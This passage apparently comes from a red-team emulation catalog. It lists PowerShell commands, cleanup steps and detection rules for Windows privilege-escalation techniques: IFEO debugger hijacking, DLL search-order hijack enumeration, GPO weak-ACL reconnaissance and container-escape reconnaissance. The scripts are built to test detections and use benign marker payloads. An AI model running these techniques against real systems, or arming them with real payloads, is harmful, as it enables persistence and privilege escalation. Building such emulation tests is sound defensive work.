detection)'
scripts.cleanup_command: Write-Host '[INFO] T1078 cleanup: no artefacts - read-only account enumeration and API calls only'
scripts.detection_rule: Local admin account enumeration + built-in admin status + LogonUser API calls (valid accounts privesc)

scripts.name: Excalibur - PrivEsc-T1546-IFEO Debugger Hijack
scripts.description: Simulates Image File Execution Options (IFEO) debugger hijacking used for privilege escalation and persistence: writes a Debugger value to HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\<target>.exe pointing to cmd.exe (the classic IFEO hijack). Uses a benign non-system executable as the target (notepad.exe) to avoid system disruption. Also demonstrates the GlobalFlag IFEO variant used by advanced adversaries. IFEO debugger write requires no admin for HKCU variant. HKLM requires admin but the attempt and access denied are both logged. Immediately removes the key. IFEO modifications are monitored by MDE as a high-fidelity persistence and privilege escalation indicator.
scripts.command: Write-Host '[START] T1546.012 - IFEO Debugger Hijack (Image File Execution Options)'; $stagingDir = [System.Environment]::ExpandEnvironmentVariables('#{excalibur_pe_staging_dir}'); if (-not (Test-Path $stagingDir)) { New-Item -ItemType Directory -Path $stagingDir -Force | Out-Null }; $ifeoBase = 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options'; $targetExe = 'notepad.exe'; $ifeoTarget = Join-Path $ifeoBase $targetExe; $markerFile = Join-Path $stagingDir 'ifeo-hijack-marker.txt'; $debuggerPayload = 'cmd.exe /c echo MorganaIFEOHijackT1546 > "' + $markerFile + '"'; Write-Host ('[INFO] Target IFEO key: ' + $ifeoTarget); Write-Host ('[INFO] Debugger payload: ' + $debuggerPayload); Write-Host '[INFO] Method 1/2: HKLM IFEO Debugger write (admin required - access denied expected, attempt logged)'; try { if (-not (Test-Path $ifeoTarget)) { New-Item -Path $ifeoTarget -Force -ErrorAction Stop | Out-Null } ; Set-ItemProperty -Path $ifeoTarget -Name 'Debugger' -Value $debuggerPayload -ErrorAction Stop; Write-Host ('[WARN] HKLM IFEO Debugger set on ' + $targetExe + ': ' + $debuggerPayload + ' (MDE: IFEO Debugger write - high confidence persistence/privesc indicator)'); Start-Sleep 1; Remove-ItemProperty -Path $ifeoTarget -Name 'Debugger' -ErrorAction SilentlyContinue; $empty = @(Get-Item $ifeoTarget -ErrorAction SilentlyContinue).Property; if (@($empty).Count -eq 0) { Remove-Item -Path $ifeoTarget -Force -ErrorAction SilentlyContinue }; Write-Host '[INFO] HKLM IFEO key cleaned immediately' } catch { Write-Host ('[INFO] HKLM IFEO write: ' + $_.Exception.Message.Split([char]10)[0] + ' (access denied - admin required for HKLM - attempt was logged by MDE)') }; Write-Host '[INFO] Method 2/2: IFEO GlobalFlag variant (silent process exit monitoring - used for advanced persistence)'; $silentProc = 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit'; Write-Host ('[INFO] SilentProcessExit path: ' + $silentProc); try { $spxExists = Test-Path $silentProc; Write-Host ('[INFO] SilentProcessExit key exists: ' + $spxExists + ' (adversaries write to this to trigger process on target process exit)'); $gfPayload = Join-Path $ifeoBase ($targetExe + '-gf'); if (-not (Test-Path $gfPayload)) { New-Item -Path $gfPayload -Force -ErrorAction Stop | Out-Null }; Set-ItemProperty -Path $gfPayload -Name 'GlobalFlag' -Value 0x200 -ErrorAction Stop; Write-Host ('[INFO] GlobalFlag 0x200 (FLG_MONITOR_SILENT_PROCESS_EXIT) set on ' + $targetExe + ' (MDE: IFEO GlobalFlag persistence)'); Remove-Item -Path $gfPayload -Force -ErrorAction SilentlyContinue; Write-Host '[INFO] GlobalFlag key cleaned' } catch { Write-Host ('[INFO] GlobalFlag: ' + $_.Exception.Message.Split([char]10)[0]) }; Write-Host '[SUCCESS] T1546 - IFEO debugger hijack simulation completed. Sentinel target: HKLM IFEO Debugger key write + GlobalFlag modification (MDE - IFEO hijack persistence/privesc behavioral detection)'
scripts.cleanup_command: $ifeoTarget = 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe'; Remove-ItemProperty -Path $ifeoTarget -Name 'Debugger' -ErrorAction SilentlyContinue; Remove-Item -Path ($ifeoTarget + '-gf') -Force -ErrorAction SilentlyContinue; $stagingDir = [System.Environment]::ExpandEnvironmentVariables('#{excalibur_pe_staging_dir}'); if (Test-Path $stagingDir) { Remove-Item -Path $stagingDir -Recurse -Force -ErrorAction SilentlyContinue }; Write-Host '[INFO] T1546 cleanup: IFEO keys and staging dir removed'
scripts.detection_rule: HKLM IFEO Debugger key write + GlobalFlag modification on target executable (IFEO hijack)

scripts.name: Excalibur - PrivEsc-T1574-DLL Search Order Hijacking
scripts.description: Enumerates the DLL search order hijacking attack surface: (1) identifies all writable directories in the system PATH environment variable (directories where a user-writable folder appears before a system folder, enabling DLL planting); (2) checks for missing DLLs in known vulnerable paths using procmon-style detection patterns; (3) enumerates running processes that load DLLs from non-standard directories (out-of-place DLL loads are often hijack opportunities); (4) checks for phantom DLL opportunities in known vulnerable locations (WindowsCodecsRaw.dll, VERSION.dll, WINMM.dll in user-writable directories). All read-only. DLL search order hijacking is a top-5 privilege escalation technique on Windows.
scripts.command: Write-Host '[START] T1574.001 - DLL Search Order Hijacking (writable PATH + phantom DLL surface enumeration)'; Write-Host '[INFO] Step 1/4: Writable directories in system PATH'; $pathDirs = $env:PATH -split ';' | Where-Object { $_ -ne '' } | ForEach-Object { $_.TrimEnd('\') }; Write-Host ('[INFO] PATH entries: ' + $pathDirs.Count); $writablePaths = @(); foreach ($dir in $pathDirs) { try { if (Test-Path $dir) { $testFile = Join-Path $dir ('morgana-write-test-' + [System.Guid]::NewGuid().ToString('N').Substring(0,8) + '.tmp'); try { [System.IO.File]::WriteAllText($testFile, 'test'); Remove-Item $testFile -Force -ErrorAction SilentlyContinue; $writablePaths += $dir; Write-Host ('[WARN]   WRITABLE: ' + $dir + ' (DLL hijack opportunity)') } catch { Write-Host ('[INFO]   Protected: ' + $dir) } } } catch {} }; Write-Host ('[INFO] Writable PATH dirs: ' + $writablePaths.Count + '/' + $pathDirs.Count); Write-Host '[INFO] Step 2/4: Phantom DLL opportunities (known DLLs missing from writable locations)'; $phantomDlls = @('WindowsCodecsRaw.dll','MSCTF.dll','WINMM.dll','VERSION.dll','USERENV.dll','PROPSYS.dll'); $systemDir = 'C:\Windows\System32'; foreach ($dll in $phantomDlls) { $sysPath = Join-Path $systemDir $dll; $exists = Test-Path $sysPath; foreach ($wPath in $writablePaths) { $plantPath = Join-Path $wPath $dll; $alreadyThere = Test-Path $plantPath; if (-not $alreadyThere) { Write-Host ('[INFO]   Phantom DLL opportunity: ' + $plantPath + ' (does not exist in writable PATH dir, system version: ' + $exists + ')') } } }; Write-Host '[INFO] Step 3/4: Running processes loading DLLs from user-writable directories'; try { $procs = Get-Process -ErrorAction SilentlyContinue | Select-Object -First 30; foreach ($proc in $procs) { try { $proc.Modules | Where-Object { $_.FileName -match [regex]::Escape($env:APPDATA) -or ($_.FileName -match [regex]::Escape($env:USERPROFILE) -and $_.FileName -notmatch 'AppData\\Local\\Microsoft') } | ForEach-Object { Write-Host ('[WARN]   Out-of-place DLL: ' + $proc.ProcessName + ' (PID ' + $proc.Id + ') loads ' + $_.FileName) } } catch {} } } catch {}; Write-Host '[INFO] Step 4/4: Service DLL hijack surface (services using DLLs in writable locations)'; try { $svcDlls = Get-WmiObject -Class Win32_Service -ErrorAction SilentlyContinue | Where-Object { $_.PathName -match '\.dll$' -and $_.State -eq 'Running' }; Write-Host ('[INFO] Services with DLL pathnames: ' + @($svcDlls).Count); $svcDlls | Select-Object -First 5 | ForEach-Object { Write-Host ('    ' + $_.Name + ': ' + $_.PathName) } } catch {}; Write-Host '[SUCCESS] T1574 - DLL search order hijack surface enumeration completed. Sentinel target: Write-test to PATH directories + phantom DLL path enumeration (MDE - DLL hijack surface discovery behavioral detection)'
scripts.cleanup_command: Get-ChildItem -Path ($env:PATH -split ';') -Filter 'morgana-write-test-*.tmp' -ErrorAction SilentlyContinue | Remove-Item -Force -ErrorAction SilentlyContinue; Write-Host '[INFO] T1574 cleanup: write-test temp files removed'
scripts.detection_rule: Write-test to PATH directories + phantom DLL enumeration + out-of-place DLL load detection (DLL hijack surface)

scripts.name: Excalibur - PrivEsc-T1484-Group Policy Modification
scripts.description: Enumerates Group Policy Objects and associated ACLs to identify weak permissions that adversaries could exploit for privilege escalation via GPO modification (T1484.001): (1) enumerates all GPOs in the domain via LDAP; (2) checks the gPCFileSysPath SYSVOL path ACLs for each GPO (the SYSVOL file share ACL is where weak permissions are most commonly exploited); (3) checks GPMC-style permissions on GPO container objects; (4) enumerates GPO links on high-value OUs (Domain Controllers OU is the primary target); (5) checks local Group Policy Scripts paths for writable permissions. GPO ACL enumeration from a non-GPMC tool is a MDE AD recon signal.
scripts.command: Write-Host '[START] T1484 - Group Policy Modification recon (GPO ACL weak permission enumeration)'; Write-Host '[INFO] Step 1/4: GPO enumeration via LDAP (domain-joined only)'; $gpoDetails = @(); try { $gpoSearcher = New-Object System.DirectoryServices.DirectorySearcher; $gpoSearcher.Filter = '(objectClass=groupPolicyContainer)'; $gpoSearcher.PropertiesToLoad.AddRange(@('displayName','cn','gPCFileSysPath','nTSecurityDescriptor')) | Out-Null; $gpoSearcher.SizeLimit = 50; $gpos = $gpoSearcher.FindAll(); Write-Host ('[INFO] GPOs found in domain: ' + $gpos.Count); $gpos | Select-Object -First 20 | ForEach-Object { $name = [string]($_.Properties['displayname']); $path = [string]($_.Properties['gpcfilesyspath']); $gpoDetails += @{ Name=$name; SysvolPath=$path }; Write-Host ('    GPO: ' + $name + ' | SYSVOL: ' + $path) } } catch { Write-Host ('[INFO] GPO LDAP enum: ' + $_.Exception.Message.Split([char]10)[0] + ' (workgroup machine or access denied)') }; Write-Host '[INFO] Step 2/4: SYSVOL path ACL check for each GPO (weak ACL = GPO hijack opportunity)'; $weakGpos = @(); foreach ($gpo in $gpoDetails) { try { if ($gpo.SysvolPath -and (Test-Path $gpo.SysvolPath)) { $acl = Get-Acl -Path $gpo.SysvolPath -ErrorAction SilentlyContinue; $weak = $acl.Access | Where-Object { $_.FileSystemRights -match 'FullControl|Modify|Write' -and $_.IdentityReference -match 'Authenticated Users|Everyone|Domain Users|BUILTIN\\Users' }; if (@($weak).Count -gt 0) { $weakGpos += @{ Name=$gpo.Name; Path=$gpo.SysvolPath; Rights=($weak[0].IdentityReference.Value + ':' + $weak[0].FileSystemRights) }; Write-Host ('[WARN]   WEAK GPO ACL: ' + $gpo.Name + ' -> ' + $weak[0].IdentityReference + ' has ' + $weak[0].FileSystemRights) } } } catch {} }; Write-Host ('[INFO] GPOs with potentially weak SYSVOL ACL: ' + $weakGpos.Count); Write-Host '[INFO] Step 3/4: GPO links on Domain Controllers OU (highest-impact target for GPO hijack)'; try { $dcOuSearcher = New-Object System.DirectoryServices.DirectorySearcher; $dcOuSearcher.Filter = '(&(objectCategory=organizationalUnit)(ou=Domain Controllers))'; $dcOuSearcher.PropertiesToLoad.Add('gpLink') | Out-Null; $dcOu = $dcOuSearcher.FindOne(); if ($dcOu -and $dcOu.Properties['gplink']) { $gpLinks = [string]($dcOu.Properties['gplink']); Write-Host ('[INFO] GPO links on Domain Controllers OU: ' + ($gpLinks.Split(']') | Where-Object { $_ -match 'LDAP' }).Count + ' GPOs linked'); Write-Host ('[INFO] GPO modification on DC OU = ALL domain controllers affected immediately') } else { Write-Host '[INFO] DC OU: not found or no GPO links' } } catch { Write-Host ('[INFO] DC OU GPO check: ' + $_.Exception.Message.Split([char]10)[0]) }; Write-Host '[INFO] Step 4/4: Local GPO scripts path (Group Policy Scripts folders - writable = arbitrary script execution)'; $localGpoPaths = @( 'C:\Windows\System32\GroupPolicy\Machine\Scripts\Startup', 'C:\Windows\System32\GroupPolicy\Machine\Scripts\Shutdown', 'C:\Windows\System32\GroupPolicy\User\Scripts\Logon', 'C:\Windows\System32\GroupPolicy\User\Scripts\Logoff' ); foreach ($gpPath in $localGpoPaths) { $exists = Test-Path $gpPath; $writable = $false; if ($exists) { try { $tf = Join-Path $gpPath ('morgana-gpo-test-' + [System.Guid]::NewGuid().ToString('N').Substring(0,8) + '.tmp'); [System.IO.File]::WriteAllText($tf, 'test'); Remove-Item $tf -Force -ErrorAction SilentlyContinue; $writable = $true } catch {} }; Write-Host ('[' + $(if ($writable) { 'WARN' } else { 'INFO' }) + '] Local GPO scripts: ' + $gpPath + ' | Exists: ' + $exists + ' | Writable: ' + $writable) }; Write-Host '[SUCCESS] T1484 - GPO modification recon completed. Sentinel target: LDAP GPO ACL enumeration + SYSVOL path write test + local GPO scripts path access (MDE - GPO privesc recon behavioral detection)'
scripts.cleanup_command: Get-ChildItem -Path 'C:\Windows\System32\GroupPolicy' -Filter 'morgana-gpo-test-*.tmp' -Recurse -ErrorAction SilentlyContinue | Remove-Item -Force -ErrorAction SilentlyContinue; Write-Host '[INFO] T1484 cleanup: write-test files removed'
scripts.detection_rule: LDAP GPO enumeration + SYSVOL ACL check + local GPO scripts path write test (GPO weak ACL recon)

scripts.name: Excalibur - PrivEsc-T1611-Escape to Host
scripts.description: Performs container and hypervisor escape detection and recon: (1) detects if running inside a Docker/Windows container (docker.sock path, container metadata, cgroup evidence); (2) detects if running inside a VM/hypervisor (WMI Win32_ComputerSystem.Model, CPUID hypervisor bit, Hyper-V/VMware/VirtualBox artifacts); (3) checks for container escape preconditions (privileged container indicators, mounted host filesystem, Docker socket access, CAP_SYS_ADMIN equivalent on Windows); (4) enumerates Hyper-V VM guest artifacts that indicate the boundary to the host. This recon step is performed by adversaries after gaining access to determine if they are in a container/VM and whether escape to the host hypervisor is feasible.
scripts.command: Write-Host '[START] T1611 - Escape to Host (container/VM/hypervisor detection and escape surface recon)'; Write-Host '[INFO] Step 1/4: Container detection (Docker/Windows Container indicators)'; $containerIndicators = @( @{Check='docker.sock socket'; Path='\\.\pipe\docker_engine'; Type='pipe'}, @{Check='containerd socket'; Path='\\.\pipe\containerd-containerd'; Type='pipe'}, @{Check='container runtime metadata'; Path='C:\ProgramData\docker'; Type='dir'}, @{Check='Windows Container hive'; Path='HKLM:\SYSTEM\CurrentControlSet\Services\hns'; Type='reg'} ); $inContainer = $false; foreach ($ind in $containerIndicators) { $found = switch ($ind.Type) { 'pipe' { Test-Path $ind.Path -ErrorAction SilentlyContinue }; 'dir' { Test-Path $ind.Path -ErrorAction SilentlyContinue }; 'reg' { Test-Path $ind.Path -ErrorAction SilentlyContinue }; default { $false } }; if ($found) { $inContainer = $true; Write-Host ('[WARN]   CONTAINER INDICATOR: ' + $ind.Check + ' found at ' + $ind.Path) } else { Write-Host ('[INFO]   Not found: ' + $ind.Check) } }; Write-Host ('[INFO] Container assessment: ' + $(if ($inContainer) { 'LIKELY IN CONTAINER - escape to host may be feasible' } else { 'Not detected in container' })); Write-Host '[INFO] Step 2/4: Hypervisor / VM detection'; try { $cs = Get-WmiObject -Class Win32_ComputerSystem -ErrorAction SilentlyContinue; $bios = Get-WmiObject -Class Win32_BIOS -ErrorAction SilentlyContinue; $vmIndicators = @('VirtualBox','VMware','Hyper-V','QEMU','KVM','Xen','Amazon EC2','Google Cloud','Microsoft Corporation','Parallels'); $isVM = $false; foreach ($vmi in $vmIndicators) { if ($cs.Model -match $vmi -or $cs.Manufacturer -match $vmi -or $bios.Manufacturer -match $vmi -or $bios.SMBIOSBIOSVersion -match $vmi) { $isVM = $true; Write-Host ('[WARN]   VM INDICATOR: ' + $vmi + ' found in system model/BIOS (' + $cs.Model + ')') } }; if (-not $isVM) { Write-Host ('[INFO] No VM indicators in WMI (physical hardware or well-hidden VM)') } } catch {}; Write-Host '[INFO] Step 3/4: Hyper-V guest artifacts (boundary to host)'; $hypervArtifacts = @( 'HKLM:\SOFTWARE\Microsoft\Virtual Machine\Guest\Parameters', 'HKLM:\SYSTEM\CurrentControlSet\Services\vmicheartbeat', 'HKLM:\SYSTEM\CurrentControlSet\Services\vmicrdv', 'C:\Windows\System32\vmcomputeagent.exe' ); foreach ($hva in $hypervArtifacts) { $exists = Test-Path $hva -ErrorAction SilentlyContinue; if ($exists) { Write-Host ('[WARN]   Hyper-V guest artifact: ' + $hva) }; }; try { $hvRegPath = 'HKLM:\SOFTWARE\Microsoft\Virtual Machine\Guest\Parameters'; if (Test-Path $hvRegPath) { $hvParams = Get-ItemProperty -Path $hvRegPath -ErrorAction SilentlyContinue; Write-Host ('[INFO] Hyper-V guest params: HostName=' + $hvParams.HostName + ' | PhysicalHostNameFullyQualified=' + $hvParams.PhysicalHostNameFullyQualified) } } catch {}; Write-Host '[INFO] Step 4/4: Named pipe escape surface (Hyper-V VMBus / Container host communication pipes)'; $escapePipes = @( @{Name='vmicheartbeat';Pipe='\\.\pipe\vmicheartbeat'}, @{Name='vmicrdv';Pipe='\\.\pipe\vmicrdv'}, @{Name='vmbusr0';Pipe='\\.\pipe\vmbusr0'}, @{Name='docker_engine';Pipe='\\.\pipe\docker_engine'} ); foreach ($ep in $escapePipes) { $exists = Test-Path $ep.Pipe -ErrorAction SilentlyContinue; if ($exists) { Write-Host ('[WARN]   PIPE ACCESSIBLE: ' + $ep.Name + ' at ' + $ep.Pipe + ' (potential hypervisor/container boundary)') } }; Write-Host '[SUCCESS] T1611 - Escape to host recon completed. Sentinel target: Container socket access + Hyper-V guest registry + VMBus pipe access from non-VM-management process (MDE - container/VM escape recon behavioral detection)'
scripts.cleanup_command: Write-Host '[INFO] T1611 cleanup: no artefacts - read-only container/VM detection'
scripts.detection_rule: Docker socket + Hyper-V guest registry + VMBus pipe access from non-VM-management process (escape to host recon)
